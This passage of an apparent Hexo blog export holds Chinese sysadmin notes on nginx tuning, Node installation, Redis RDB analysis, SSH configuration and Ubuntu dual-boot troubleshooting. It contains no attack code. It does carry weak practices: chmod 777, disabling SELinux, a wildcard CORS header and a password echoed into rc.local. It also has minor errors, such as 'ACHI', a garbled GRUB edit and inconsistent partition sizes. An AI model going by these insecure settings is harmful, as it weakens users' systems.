...</span><br><span class="line">    upstream tomcat &#123;</span><br><span class="line">        server ops-coffee.cn:8080;</span><br><span class="line">        keepalive 1024;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_http_version 1.1;</span><br><span class="line">            proxy_set_header Connection &quot;&quot;;</span><br><span class="line">            proxy_pass http://tomcat;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nginx在项目中大多数情况下会作为反向代理使用，例如nginx后接tomcat，nginx后接php等，这时我们开启nginx和后端服务之间的keepalive能够减少频繁创建TCP连接造成的资源消耗，配置如上。</p><p>keepalive：指定每个nginxworker可以保持的最大连接数量为1024，默认不设置，即nginx作为client时keepalive未生效。</p><p>proxy_http_version 1.1：开启keepalive要求HTTP协议版本为HTTP 1.1。</p><p>proxy_set_header Connection “”：为了兼容老的协议以及防止http头中有Connection<br>close导致的keepalive失效，这里需要及时清掉HTTP头部的Connection。</p><h3 id="11、nginx设置gzip"><a href="#11、nginx设置gzip" class="headerlink" title="11、nginx设置gzip"></a>11、nginx设置gzip</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启gzip</span></span><br><span class="line">gzip off;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用gzip压缩的最小文件，小于设置值的文件将不会压缩</span></span><br><span class="line">gzip_min_length 1k;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gzip压缩级别，1-9，数字越大压缩的越好，也越占用CPU时间，后面会有详细说明</span></span><br><span class="line">gzip_comp_level 1;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是否在http header中添加Vary:Accept-Encoding，建议开启</span></span><br><span class="line">gzip_vary on;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置禁用gzip条件，支持正则。此处表示ie6及以下不启用gzip（因为ie低版本不支持）</span></span><br><span class="line">gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置压缩所需要的缓冲区大小</span></span><br><span class="line">gzip_buffers 32 4k;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置gzip压缩针对的HTTP协议版本</span></span><br><span class="line">gzip_http_version 1.0;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行压缩的文件类型。javascript有多种形式。其中的值可以在mime.types文件中找到</span></span><br><span class="line">gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png application/vnd.ms-fontobject font/ttf font/opentype font/x-woff image/svg+xml;</span><br></pre></td></tr></table></figure><h3 id="12、nginx配置二级域名"><a href="#12、nginx配置二级域名" class="headerlink" title="12、nginx配置二级域名"></a>12、nginx配置二级域名</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">代理池配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name proxy.xxx.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://111.111.111.111:5010/;</span><br><span class="line">        add_header Access-Control-Allow-Origin *;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13、自定义404或502页面"><a href="#13、自定义404或502页面" class="headerlink" title="13、自定义404或502页面"></a>13、自定义404或502页面</h3><p>当服务器出错时，访问域名会报404或502错误，如果想展示信息给用户的话，必须要自定义界面。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx配置：</span><br><span class="line">server &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置nginx502错误配置</span></span><br><span class="line">error_page 502 /502.html;</span><br><span class="line">location = /502.html &#123;</span><br><span class="line">root /usr/share/nginx/html;&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置nginx404错误配置</span></span><br><span class="line">error_page 404 /404.html;</span><br><span class="line">location = /404.html &#123;</span><br><span class="line">root /usr/share/nginx/html;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置完再去&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html目录下添加自定义的404.html和502.html文件即可。</p><h3 id="14、404自动跳转到首页"><a href="#14、404自动跳转到首页" class="headerlink" title="14、404自动跳转到首页"></a>14、404自动跳转到首页</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">       error_page 404 =  @ops-coffee;</span><br><span class="line">    &#125;</span><br><span class="line">    location @ops-coffee &#123;</span><br><span class="line">       rewrite  .*  / permanent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网站出现404页面不是特别友好，我们可以通过上边的配置在出现404之后给自动跳转到首页去。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No35：Node安装方法</title>
      <link href="/posts/78b0782c.html"/>
      <url>/posts/78b0782c.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>安装Node12.16.2</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">准备编译环境</span></span><br><span class="line">yum -y install gcc gcc-c++ openssl-devel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换目录</span></span><br><span class="line">cd /usr/local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载Node12.16.2压缩包</span></span><br><span class="line">wget http://nodejs.org/dist/v12.16.2/node-v12.16.2-linux-x64.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf node-v12.16.2-linux-x64.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重命名文件夹</span></span><br><span class="line">mv node-v12.16.2-linux-x64 node</span><br></pre></td></tr></table></figure><ul><li>添加环境变量</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑文件</span></span><br><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加</span></span><br><span class="line">export PATH=$PATH:/usr/local/node/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新生效</span></span><br><span class="line">source ~/.bashrc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证环境</span></span><br><span class="line">node -v</span><br></pre></td></tr></table></figure><ul><li>设置淘宝npm源</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置npm源</span></span><br><span class="line">npm config set registry https://registry.npmmirror.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证源</span></span><br><span class="line">npm config get registry</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">npm替换为cnpm</span></span><br><span class="line">npm install -g cnpm --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No34：安装Chrome插件时出现crx_header_invalid的解决方法</title>
      <link href="/posts/f7b8777d.html"/>
      <url>/posts/f7b8777d.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>出现这个问题首先你去找到你下载好的CRX文件，把它的后缀改成“ZIP”或者“RAR”。</p></li><li><p>如果出现不可用的警告，直接选择是就可以。</p></li><li><p>再然后去新建一个文件夹，将刚才的压缩包解压到该文件夹。</p></li><li><p>再然后点开浏览器的右上角的三个点。</p></li><li><p>接着在更多工具里面选择扩展程序。</p></li><li><p>在左上角点击开发者模式后，选择已经解压的扩展程序，然后去选择到刚才新建的文件夹。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No33：Redis可视化分析资源占用情况</title>
      <link href="/posts/90961b81.html"/>
      <url>/posts/90961b81.html</url>
      
        <content type="html"><![CDATA[<ol><li><a href="https://github.com/xueqiu/rdr/releases">RDR下载地址</a></li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">赋予可执行权限</span></span><br><span class="line">chmod 777 rdr-linux</span><br></pre></td></tr></table></figure><ol start="2"><li><p>找到dump.rdb文件，Redis默认开启了RDB方式的持久化储存。默认情况下，dump.rdb文件在&#x2F;var&#x2F;lib&#x2F;redis&#x2F;dump.rdb，只有root用户可以读取。</p></li><li><p>提权后把dump.rdb文件复制出来，修改成当前用户可操作。</p></li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">cd ~</span><br><span class="line">cp /var/lib/redis/dump.rdb ./</span><br><span class="line">chown ec2-user:ec2-user dump.rdb</span><br></pre></td></tr></table></figure><ol start="4"><li>获取dump.rdb文件后，让RDR读取dump.rdb文件。</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./rdr-linux show -p 8766 dump.rdb</span><br></pre></td></tr></table></figure><ol start="5"><li>打开浏览器，输入IP:8766，即可可视化分析Redis了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No32：Redis常见问题汇总</title>
      <link href="/posts/bc296eb.html"/>
      <url>/posts/bc296eb.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、MISCONF-Redis-is-configured-to-save-RDB-snapshots-but-is-currently-not-able-to-persist-on"><a href="#1、MISCONF-Redis-is-configured-to-save-RDB-snapshots-but-is-currently-not-able-to-persist-on" class="headerlink" title="1、MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on"></a>1、MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on</h3><ul><li>出现原因</li></ul><p>Redis被配置为保存数据库快照，但它目前不能持久化到硬盘</p><p>猜测是硬盘空间不足，Redis不能保存快照，只能关闭快照或者加硬盘空间</p><ul><li>解决方法</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">临时解决</span></span><br><span class="line">redis-cli</span><br><span class="line">127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久解决</span></span><br><span class="line">sudo su</span><br><span class="line">sysctl vm.overcommit_memory=1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No31：SSH服务详解</title>
      <link href="/posts/a9036d7f.html"/>
      <url>/posts/a9036d7f.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>SSH提供了口令和密钥两种用户验证方式，这两者都是通过密文传输数据的。</p><p>不同的是，口令用户验证方式传输的是用户的账户名和密码，这要求输入的密码具有足够的复杂度才能具有更高的安全性。</p><p>而基于密钥的安全验证必须为用户自己创建一对密钥，并把共有的密钥放在需要访问的服务器上。当需要连接到SSH服务器上时，客户端软件就会向服务器发出请求，请求使用客户端的密钥进行安全验证。</p><p>服务器收到请求之后，先在该用户的根目录下寻找共有密钥，然后把它和发送过来的公有密钥进行比较。如果两个密钥一致，服务器就用公有的密钥加密“质询”，并把它发送给客户端软件。</p><p>客户端收到质询之后，就可以用本地的私人密钥解密再把它发送给服务器。这种方式是相当安全的。</p><h3 id="2、安装SSH"><a href="#2、安装SSH" class="headerlink" title="2、安装SSH"></a>2、安装SSH</h3><p>ssh软件由两部分组成：ssh服务端和ssh客户端。</p><p>ssh的配置文件在&#x2F;etc&#x2F;ssh&#x2F;目录下，其中服务端的配置文件是sshd_config，客户端的配置文件是ssh_config。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y openssh-*</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、配置ssh服务器"><a href="#3、配置ssh服务器" class="headerlink" title="3、配置ssh服务器"></a>3、配置ssh服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认使用22端口，也可以自行修改为其他端口，但登录时要打上端口号</span></span><br><span class="line">Port 22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端多少秒向服务端发送一个心跳数据</span></span><br><span class="line">ClientAliveInterval 10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端多少秒没有响应则服务器自动断掉连接</span></span><br><span class="line">ClientAliveCountMax 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定提供ssh服务的IP</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ListenAddress</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁止以root远程登录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PermitRootLogin</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用口令验证方式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PasswordAuthentication</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁止使用空密码登录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PermitEmptyPassword</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重复验证时间为1分钟</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">LoginGraceTime 1m</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最大重试验证次数</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MaxAuthTries 6</span></span><br></pre></td></tr></table></figure><ul><li>修改默认端口，需要关闭SELinux</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/selinux/config</span><br><span class="line"></span><br><span class="line">SELINUX=disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、重启sshd服务"><a href="#4、重启sshd服务" class="headerlink" title="4、重启sshd服务"></a>4、重启sshd服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No30：Ubuntu16+Windows10双系统问题记录</title>
      <link href="/posts/938926fd.html"/>
      <url>/posts/938926fd.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、Ubuntu系统安装"><a href="#一、Ubuntu系统安装" class="headerlink" title="一、Ubuntu系统安装"></a>一、Ubuntu系统安装</h3><ol><li><p>进入bios设置，开机狂按F2。</p></li><li><p>进入Configuration选项，把SATA Controller Mode设置为ACHI模式。</p></li><li><p>进入Security选项，把Secure Boot选为disabled。</p></li><li><p>进入Boot选项，将Boot Mode设置为UEFI，将USB Boot设置为Enabled。</p></li><li><p>安装遇到卡在logo的问题以及安装完后卡在logo的问题。</p></li></ol><p>情况一、</p><p>1.在选项卡的位置用上下键选择Install ubuntu的选项，先别点，按e进入编辑选项，会看到quiet splash<br>—字样的代码，将—去除，输入nomodeset（内核不加载视频驱动程序）。按F10重新引导。</p><p>2.下次开机还会遇到问题，在引导界面中，在ubuntu选项上，先别点，按e进入编辑选项，会看到quiet splash<br>—字样的代码，将—去除，输入nomodeset。按F10重新引导。</p><p>3.进入系统后，按照系统适配安装专有NVIDIA驱动。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/default/grub</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash”</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">改为</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash nomodeset”</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终端更新一下grub</span></span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>情况二、</p><p>1.在选卡项的位置用上下键选择Install ubuntu的选项，先别点，按e进入编辑选项，会看到quiet splash<br>—字样的代码，在—后面，输入acpi&#x3D;off（关闭高级电源管理接口）。按F10重新引导。</p><p>2.下次开机还会遇到问题，在引导界面中，在ubuntu选项上，先别点，按e进入编辑选项，会看到quiet splash<br>—字样的代码，在—后面，输入acpi&#x3D;off。按F10重新引导。</p><p>3.进入系统后，按照系统适配安装专有NVIDIA驱动。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/default/grub</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将acpi=off删去，双引号不用删去，保存。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终端更新一下grub</span></span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><h3 id="二、启动盘制作"><a href="#二、启动盘制作" class="headerlink" title="二、启动盘制作"></a>二、启动盘制作</h3><ol><li>官网下载需要的Ubuntu镜像文件。</li><li>rufus制作U盘启动盘，操作很简单，相关教程很多。</li></ol><h3 id="三、安装Ubuntu系统"><a href="#三、安装Ubuntu系统" class="headerlink" title="三、安装Ubuntu系统"></a>三、安装Ubuntu系统</h3><h4 id="1、分区设置"><a href="#1、分区设置" class="headerlink" title="1、分区设置"></a>1、分区设置</h4><p>UEFI+GPT与Legacy+MBR不同的是不用挂载在&#x2F;boot下，而是选择EFI。</p><ul><li>200M，采用逻辑分区，用于efi。（这个类似于旧方法的boot）</li></ul><p>efi系统分区，选中逻辑分区（这里不是主分区，请勿怀疑，老式的boot挂载才是主分区）和空间起始位置，大小2048Mb,它的作用和boot引导分区一样，但是boot引导是默认grub引导的，而efi显然是UEFI引导的。不要按照那些老教程去选boot引导分区，也就是最后你的挂载点里没有“&#x2F;boot”这一项，否则你就没办法UEFI启动两个系统了。</p><ul><li>8GM，采用逻辑分区，用于swap。</li></ul><p>swap交换空间，这个也就是虚拟内存的地方，选择主分区和空间起始位置。如果你给Ubuntu系统分区容量足够的话，最好是能给到你物理内存的2倍大小，像我8GB内存，就可以给个16GB的空间给它，这个看个人使用情况，太小也不好，太大也没用。</p><ul><li>20G，采用主分区，用于Ext 4，挂载到&#x2F;。</li></ul><p>最后，挂载“&#x2F;”，（即根目录）类型为EXT4日志文件系统，选中主分区和空间起始位置，“&#x2F;”就把除了之前你挂载的home的全部杂项囊括了，大小也不要太小，一般30GB。</p><ul><li>将剩下所有空间分配给&#x2F;home，采用逻辑分区，用于Ext 4，挂载到home。</li></ul><p>挂载“&#x2F;home”，类型为EXT4日志文件系统，选中逻辑分区和空间起始位置，这个相当于你的个人文件夹，类似Windows里的User，我建议最好能分配稍微大点，因为你的图片、视频、下载内容基本都在这里面，一般50GB给home。</p><h4 id="2、启动问题"><a href="#2、启动问题" class="headerlink" title="2、启动问题"></a>2、启动问题</h4><p>安装完成后，是Ubuntu的grub引导界面，可以在该页面选择进入Ubuntu或windows系统。</p><p>由于之前设置SATA Controller Mode为ACHI模式，发现导致Windows启动不了。解决办法：</p><ol><li>进入win10系统，重启系统为“安全模式”。</li><li>进入bios设置，将SATA Controller Mode改为ACHI模式，保存退出。</li><li>重启计算机，进入win10“安全模式”，进入安全模式后再重启，正常进入win10正常。</li></ol><h3 id="四、ubuntu-windows双系统默认启动项轻松切换"><a href="#四、ubuntu-windows双系统默认启动项轻松切换" class="headerlink" title="四、ubuntu windows双系统默认启动项轻松切换"></a>四、ubuntu windows双系统默认启动项轻松切换</h3><p>1.同时按住键盘上的“Ctrl Alt T”三个键（即快捷键“Ctrl+Alt+T”），打开终端窗口</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/default/grub</span><br></pre></td></tr></table></figure><p>2.把grub文件中的GRUB_DEFAULT&#x3D;0中的0改为saved</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将</span></span><br><span class="line">GRUB_DEFAULT=0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">改为</span></span><br><span class="line">saved</span><br></pre></td></tr></table></figure><p>3.在文件末尾添加</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GRUB_SAVEDEFAULT=true</span><br></pre></td></tr></table></figure><p>4.保存文件并退出</p><p>5.在终端输入</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>更新启动配置文件</p><p>6.重启系统</p><p>重启到启动菜单时，选择你要更改为默认启动项的系统，按Enter键确认启动即可，下次启动时刚刚选择的系统即为默认启动系统，直到你手动选择启动其他的系统为止。以后可以轻易的来回切换默认系统了</p><h3 id="五、ubuntu系统重启卡死"><a href="#五、ubuntu系统重启卡死" class="headerlink" title="五、ubuntu系统重启卡死"></a>五、ubuntu系统重启卡死</h3><ul><li>卸载原有显卡驱动：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove --purge nvidia*</span><br></pre></td></tr></table></figure><ul><li>禁用集卡驱动：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/modprobe.d/blacklist.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文本最后添加：</span></span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><ul><li>更新系统内核</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-initramfs -u</span><br></pre></td></tr></table></figure><ul><li>安装NVIDIA驱动</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:xorg-edgers/ppa -y</span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据需要选择版本</span></span><br><span class="line">sudo apt-get install nvidia-384</span><br></pre></td></tr></table></figure><ul><li>检验是否安装成功</li></ul><p>重启之后输入如下命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nvidia-smi</span><br><span class="line">nvidia-settings</span><br></pre></td></tr></table></figure><p>若出现NVIDIA驱动界面则安装成功，此时重启卡死等问题均不再出现。</p><h3 id="六、进入Ubuntu发现搜索不到WIFI列表"><a href="#六、进入Ubuntu发现搜索不到WIFI列表" class="headerlink" title="六、进入Ubuntu发现搜索不到WIFI列表"></a>六、进入Ubuntu发现搜索不到WIFI列表</h3><h4 id="1、原因：无线网卡被hard-blocked"><a href="#1、原因：无线网卡被hard-blocked" class="headerlink" title="1、原因：无线网卡被hard blocked"></a>1、原因：无线网卡被hard blocked</h4><p>在终端敲入：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rfkill list all</span><br></pre></td></tr></table></figure><p>会出现：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0:ideapad_wlan: Wireless LAN</span><br><span class="line">Soft blocked: no</span><br><span class="line">Hard blocked:yes</span><br><span class="line"></span><br><span class="line">1:ideapad_bluetooth: Bluetooth</span><br><span class="line">Soft blocked: no</span><br><span class="line">Hard blocked: yes</span><br><span class="line"></span><br><span class="line">2:phy0: Wireless LAN</span><br><span class="line">Soft blocked: no</span><br><span class="line">Hard blocked:no</span><br><span class="line"></span><br><span class="line">3:hci0: Bluetooth</span><br><span class="line">Soft blocked: yes</span><br><span class="line">Hard blocked: no</span><br></pre></td></tr></table></figure><p>可以看到，优先级前的ideapad_wlan的Hard blocked默认为yes，即ubuntu默认关闭了硬件wifi开关，而联想R720的wifi只有软件开关，没有硬件开关的启动，所以引起了wifi无法开启的问题。</p><h4 id="2、解决方法"><a href="#2、解决方法" class="headerlink" title="2、解决方法"></a>2、解决方法</h4><p>从无线模块的显示列表可以看出，序号2的wifi模块是软硬件是可以启动的，所以，只要将前面默认的模块移出即可。</p><ul><li>移出ideapad无线模块：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo modprobe -r ideapad_laptop</span><br></pre></td></tr></table></figure><ul><li>使用命令查看：</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rfkill list all</span><br></pre></td></tr></table></figure><p>如下提示：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2:phy0: Wireless LAN</span><br><span class="line">Soft blocked: no</span><br><span class="line">Hard blocked:no</span><br><span class="line"></span><br><span class="line">3:hci0: Bluetooth</span><br><span class="line">Soft blocked: yes</span><br><span class="line">Hard blocked: no</span><br></pre></td></tr></table></figure><p>即wifi模块工作正常，然而每次重启ubuntu系统都要重新进行模块移出，故可将该命令设置为开机自启动。</p><ul><li>命令设置为开机自启动</li></ul><p>在&#x2F;etc&#x2F;rc.local文件中添加命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/rc.local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在<span class="built_in">exit</span> 0之前加上添加命令：</span></span><br><span class="line">echo &quot;123&quot; |sudo modprobe -r ideapad_laptop</span><br></pre></td></tr></table></figure><p>开机启动后系统会自动执行改脚本文件，完成wifi模块的自动移出操作。</p><h3 id="七、Ubuntu-更换国内源"><a href="#七、Ubuntu-更换国内源" class="headerlink" title="七、Ubuntu 更换国内源"></a>七、Ubuntu 更换国内源</h3><p>1、在修改source.list前，最好先备份一份，以便日后恢复,设置为保留备份后，修改前的内容会自动保存为后缀名为bak的备份文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><p>2、打开源列表文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>3、修改更新源，任选一种国内镜像源内容复制到source.list文件中，覆盖原文件内容（“#”开头的那一行为注释，可以直接复制进文件中）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br></pre></td></tr></table></figure><p>4、更新</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除索引</span></span><br><span class="line">sudo apt-get clean</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新源</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的</span></span><br><span class="line">sudo apt-get -f install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件</span></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span 